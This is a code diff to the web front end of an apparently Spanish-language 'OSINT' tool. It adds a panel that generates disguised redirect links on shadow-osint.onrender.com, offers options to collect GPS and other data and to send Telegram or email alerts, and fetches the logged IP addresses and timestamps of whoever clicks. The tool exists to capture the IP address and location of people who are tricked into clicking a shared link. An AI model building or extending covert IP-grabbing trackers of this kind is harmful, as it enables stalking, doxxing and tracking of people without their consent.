@@ -276,6 +276,23 @@ h1 {
     <button style="background: #4af626; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; border-radius: 4px;">Search</button>
 </div>
 
+<div id="panel-informacion" class="panel-blanco" style="display: none;">
+    <h1>INFORMACIÓN DEL ENLACE</h1>
+    <div class="fila">
+        <strong>URL de redirección:</strong> <span id="url-destino"></span>
+    </div>
+    <div class="fila">
+        <strong>Enlace de seguimiento:</strong> 
+        <input type="text" id="link-rastreo" readonly>
+        <button onclick="copiarLink()">Copiar</button>
+    </div>
+    <div class="opciones">
+        <label><input type="checkbox"> Recopilar datos SMART</label>
+        <label><input type="checkbox"> Recopilar datos GPS</label>
+        <label><input type="checkbox"> Notificaciones (Telegram/Email)</label>
+    </div>
+</div>
+
 <div id="tp-ip" class="panel-herramienta" style="display: none;">
     <h1 style="color: #4af626; margin-bottom: 15px;">🔍 Rastreo de IP</h1>
     <p style="color: #b3b3cc;">Introduce una URL para generar un enlace de rastreo:</p>
@@ -283,10 +300,14 @@ h1 {
     <input type="text" id="input-ip" placeholder="Ej: https://google.com" style="background: #11111a; color: #fff; border: 1px solid #4af626; padding: 10px; width: 70%; border-radius: 4px;">
     <br>
     <button onclick="generarLinkRastreo()" style="background: #4af626; color: #000; border: none; padding: 10px 20px; cursor: pointer; margin-top: 10px; border-radius: 4px; font-weight: bold;">Generar Enlace</button>
+    
+    <input type="hidden" id="id-generado" value="">
+
     <button onclick="verificarResultados(document.getElementById('id-generado').value)" 
             style="background: #333; color: #4af626; border: 1px solid #4af626; padding: 10px; margin-top: 10px; cursor: pointer;">
         Ver Resultados
     </button>
+    
     <div id="resultado-ip" style="margin-top: 20px; color: #fff;"></div>
     <div id="mapa-ip" style="height: 300px; width: 100%; margin-top: 20px; border: 2px solid #4af626; display: none;"></div>
 </div>
@@ -448,27 +469,43 @@ h1 {
     var mapa;
 var miChart;
       
-      function generarLinkRastreo() {
-        const urlDestino = document.getElementById('input-ip').value;
-        const resDiv = document.getElementById('resultado-ip');
-
-        if (!urlDestino) {
-            alert("Por favor, introduce una URL.");
-            return;
-        }
-
-        const idUnico = Math.random().toString(36).substr(2, 9);
-        const linkGenerado = `https://shadow-osint.onrender.com/r/${idUnico}`;
-
-        resDiv.innerHTML = `
-           <p style="color: #4af626;">Enlace generado con éxito:</p>
-           <input type="text" id="id-generado" value="${linkGenerado}" readonly style="...">
-           <p>Copia y comparte...</p>
-           `;
+     function generarLinkRastreo() {
+    const urlDestino = document.getElementById('input-ip').value;
+    
+    if (!urlDestino) {
+        alert("Por favor, introduce una URL.");
+        return;
     }
+
+    const idUnico = Math.random().toString(36).substr(2, 9);
+    const linkGenerado = `https://shadow-osint.onrender.com/r/${idUnico}`;
+
+    document.getElementById('id-generado').value = idUnico;
+
+    document.getElementById('tp-ip').style.display = 'none';
+    const panelInfo = document.getElementById('panel-informacion');
+    panelInfo.style.display = 'block';
+
+    document.getElementById('url-destino').innerText = urlDestino;
+    document.getElementById('link-rastreo').value = linkGenerado;
+    
+    console.log("Enlace generado. ID:", idUnico);
+}
+
+function copiarLink() {
+    const copyText = document.getElementById("link-rastreo");
+    copyText.select();
+    document.execCommand("copy");
+    alert("Enlace copiado al portapapeles");
+}
       async function verificarResultados(idUnico) {
+    if (!idUnico) {
+        alert("Primero debes generar un enlace.");
+        return;
+    }
+
     const resDiv = document.getElementById('resultado-ip');
-    resDiv.innerHTML = "Buscando datos de rastreo...";
+    resDiv.innerHTML = "Buscando datos...";
 
     try {
         const response = await fetch(`https://shadow-osint.onrender.com/api/get-logs/${idUnico}`);
@@ -476,20 +513,19 @@ var miChart;
 
         if (data.ip) {
             resDiv.innerHTML = `
-                <div style="border: 1px solid #4af626; padding: 15px; margin-top: 10px;">
+                <div style="border: 1px solid #4af626; padding: 15px; margin-top: 10px; color: #fff;">
                     <h3 style="color: #4af626;">✅ ¡Datos capturados!</h3>
                     <p><strong>IP:</strong> ${data.ip}</p>
-                    <p><strong>Fecha/Hora:</strong> ${data.fecha}</p>
+                    <p><strong>Fecha:</strong> ${data.fecha}</p>
                 </div>
             `;
         } else {
-            resDiv.innerHTML = "<p style='color: orange;'>Aún no hay clics en este enlace. Sigue esperando...</p>";
+            resDiv.innerHTML = "<p style='color: orange;'>Aún no hay clics registrados para este ID.</p>";
         }
     } catch (error) {
-        resDiv.innerHTML = "<p style='color: red;'>Error al consultar los resultados.</p>";
+        resDiv.innerHTML = "<p style='color: red;'>Error al conectar con el servidor.</p>";
     }
 }
-
 async function ejecutarBusquedaIP() {
     var ipTarget = document.getElementById('input-ip').value;
     var resultadoDiv = document.getElementById('resultado-ip');
